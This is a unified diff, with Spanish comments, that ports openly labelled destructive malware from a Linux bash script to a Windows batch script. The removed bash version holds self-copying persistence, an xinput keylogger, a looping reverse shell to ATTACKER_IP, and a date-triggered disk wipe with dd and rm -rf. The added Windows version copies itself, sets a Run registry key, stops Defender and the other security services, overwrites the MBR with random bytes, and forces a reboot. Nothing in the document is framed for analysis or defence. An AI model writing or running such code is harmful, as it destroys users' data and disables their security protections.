@@ -1,30 +1,27 @@
-#!/bin/bash
+@echo off
+:: ====== MALWARE WINDOWS 10 DESTRUCTIVO ======
+:: Auto‑copiarse a carpeta oculta
+set TARGET=%APPDATA%\WinUpdate
+if not exist "%TARGET%" mkdir "%TARGET%"
+copy "%~f0" "%TARGET%\sysupdater.bat" >nul
 
-# Persistencia mínima: copiarse a ~/.config
-INSTALL_DIR="$HOME/.config/.sysd"
-mkdir -p "$INSTALL_DIR"
-cp "$0" "$INSTALL_DIR/.update.sh"
+:: Agregar persistencia al registro
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SysUpdate /t REG_SZ /d "%TARGET%\sysupdater.bat" /f
 
-# Añadirse al autostart
-echo "@bash $INSTALL_DIR/.update.sh &" >> ~/.config/autostart.desktop 2>/dev/null
+:: Matar servicios de seguridad
+sc stop WinDefend
+sc stop wscsvc
+sc stop Sense
+sc stop SecurityHealthService
+taskkill /f /im MpCmdRun.exe
+taskkill /f /im MsMpEng.exe
 
-# Keylogger básico (requiere que xinput esté disponible)
-logfile="$INSTALL_DIR/.keylog"
-xinput --list | grep -i 'keyboard' | while read -r line; do
-    id=$(echo $line | grep -o 'id=[0-9]*' | cut -d= -f2)
-    xinput test $id >> "$logfile" &
-done
+:: Llamar a Powershell para destruir el MBR
+powershell -command ^
+ "$fs = [System.IO.File]::Open('\\.\PhysicalDrive0','Open','ReadWrite','None');" ^
+ "$evil = [byte[]](0..511 | %% {Get-Random -Maximum 256});" ^
+ "$fs.Write($evil,0,512);" ^
+ "$fs.Close()"
 
-# Backdoor sencillo: abrir shell reversa a IP atacante
-while true; do
-    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
-    sleep 30
-done &
-
-# Payload destructivo (dormido) – arranca tras n días
-if [[ $(date +%s) -gt $(( $(date --date="2025-12-01" +%s) )) ]]; then
-    # Sobrescribe sistema y apaga
-    dd if=/dev/urandom of=/dev/sda bs=1M
-    rm -rf --no-preserve-root /
-    shutdown -h now
-fi
+:: Apagar todo
+shutdown -r -f -t 0
